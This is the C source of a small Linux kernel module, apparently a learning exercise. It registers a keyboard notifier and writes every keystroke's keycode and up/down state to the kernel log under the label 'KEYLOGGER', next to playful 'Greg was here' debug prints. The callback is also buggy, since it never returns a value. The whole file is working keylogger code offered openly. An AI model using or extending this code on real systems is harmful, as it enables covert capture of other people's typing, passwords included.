#include <linux/module.h>	/* Needed by all modules */
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    struct vc_data *vc = param->vc;

    int ret = NOTIFY_OK;

    printk("Greg was here2.");
    if (code == KBD_KEYCODE) {
        printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    }  
}

static struct notifier_block nb = {
    .notifier_call = hello_notify
};

static int hello_init(void)
{
	printk(KERN_INFO "Hello my friendly world 1.\n");
    printk("Greg was here.");
    register_keyboard_notifier(&nb);
    return 0;
}

static void hello_release(void)
{
    unregister_keyboard_notifier(&nb);
}

module_init(hello_init);
module_exit(hello_release);
